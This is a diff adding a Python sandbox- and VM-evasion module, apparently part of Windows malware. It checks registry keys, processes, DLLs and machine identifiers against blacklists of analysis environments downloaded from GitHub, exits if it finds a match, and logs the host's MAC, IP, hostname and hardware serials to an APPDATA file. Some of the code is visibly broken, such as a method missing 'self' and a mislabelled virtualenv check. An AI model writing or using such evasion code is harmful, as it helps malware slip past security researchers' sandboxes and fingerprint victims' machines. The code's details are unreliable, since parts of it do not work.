@@ -1,0 +1,181 @@
+import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket, platform
+appdata = os.getenv("APPDATA")
+DEBUG = True
+
+def create_debug_file():
+    if not os.path.exists(appdata + "\\debug.txt"):
+        with open(appdata + "\\debug.txt", "w") as f:
+            f.write("")
+
+def add_info(msg):
+    if DEBUG:
+        print("[DEBUG] " + msg)
+    with open(appdata + "\\debug.txt", "a") as f:
+        f.write(msg)
+
+def get_base_prefix_compat(): # define all of the checks
+    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
+
+def in_virtualenv(): 
+    return get_base_prefix_compat() != sys.prefix
+
+if in_virtualenv() == True: # if we are in a vm
+    os._exit(1) # exit
+    
+class BypassVM:
+
+    def registry_check(self):  
+        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
+        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
+        
+        if reg1 != 1 and reg2 != 1:
+            os._exit(1)
+
+    def processes_and_files_check(self):
+        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
+        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
+    
+        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
+        processList = []
+        for processNames in process.split(" "):
+            if ".exe" in processNames:
+                processList.append(processNames.replace("K\n", "").replace("\n", ""))
+
+        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
+            os._exit(1)
+                           
+        if os.path.exists(vmware_dll): # Detect vmware dll
+            os._exit(1)
+            
+        if os.path.exists(virtualbox_dll): # Detect virtualbox dll
+            os._exit(1)
+        
+        try:
+            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll") # Detect sandbox dll
+            os._exit(1)
+        except: pass
+
+    def mac_check(self):    # Mac detect
+        mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
+        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        
+        if mac_address in mac_list:
+            os._exit(1)
+
+        add_info(f"Mac Address:{mac_address}\n")
+    
+    def check_pc(self):     # User/Name Detect
+        vmname      = os.getlogin()
+        vm_name     = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt").text
+        vmusername  = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt").text
+        
+        if vmname in vm_name:
+            os._exit(1)
+        
+        host_name = socket.gethostname()
+        if host_name in vmusername:
+            os._exit(1)
+
+        add_info(f"VM Name:{vmname}\n")
+        add_info(f"Host Name:{host_name}\n")
+                
+    def hwid_vm(self):      # HWID detect
+        hwid_vm = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt").text
+        current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
+
+        if current_machine_id in hwid_vm:
+            os._exit(1)
+
+        add_info(f"Machine ID:{current_machine_id}\n")
+            
+    def checkgpu(self):     # GPU Detect
+        gpulist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt").text
+        c       = wmi.WMI()
+
+        for gpu in c.Win32_DisplayConfiguration():
+            GPUm = gpu.Description.strip()
+
+            if GPUm in gpulist:
+                os._exit(1)
+
+            add_info(f"GPU:{GPUm}\n")
+
+    def check_ip(self):     # IP Detect
+        ip_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt").text
+        reqip   = requests.get("https://api.ipify.org/?format=json").json()
+        ip      = reqip["ip"]
+
+        if ip in ip_list:
+            os._exit(1)
+
+        add_info(f"IP:{ip}\n")
+            
+    def profiles():         # Guids / Bios Detect etc
+        guid_pc         = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt").text
+        bios_guid       = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt").text
+        baseboard_guid  = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt").text
+        serial_disk     = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt").text
+        hwprid          = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt").text
+        serial_list     = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt").text
+
+        w = wmi.WMI()
+        machine_guid = uuid.getnode()
+        serial_ = platform.processor()
+
+        #region Check
+        if machine_guid in guid_pc:
+            os._exit(1)
+
+        add_info(f"Machine Guid:{machine_guid}\n")
+
+        if serial_ in serial_list:
+            os._exit(1)
+
+        add_info(f"Serial:{serial_}\n")
+
+        for profile in w.Win32_ComputerSystem():
+            hw_profile_guid = profile.Model
+
+            if hw_profile_guid in hwprid:
+                os._exit(1)
+
+            add_info(f"Profile Guid:{hw_profile_guid}\n")
+
+        for bios in w.Win32_BIOS():
+            bios_check = bios.SerialNumber   
+
+            if bios_check in bios_guid:
+                os._exit(1) 
+
+            add_info(f"BIOS:{bios_check}\n")
+
+        for baseboard in w.Win32_BaseBoard():
+            base_check = baseboard.SerialNumber
+
+            if base_check in baseboard_guid:
+                os._exit(1)
+
+            add_info(f"Motherboard:{base_check}\n")
+
+        for disk in w.Win32_DiskDrive():
+            disk_serial = disk.SerialNumber
+
+            if disk_serial in serial_disk:
+                os._exit(1)
+
+            add_info(f"Disk:{disk_serial}\n")
+        #endregion
+
+
+def Bypass():
+    create_debug_file()
+
+    test = BypassVM()
+    test.registry_check()
+    test.processes_and_files_check()
+    test.mac_check()
+    test.check_pc()
+    test.checkgpu()
+    test.hwid_vm()
+    test.check_ip()
+    test.profiles()
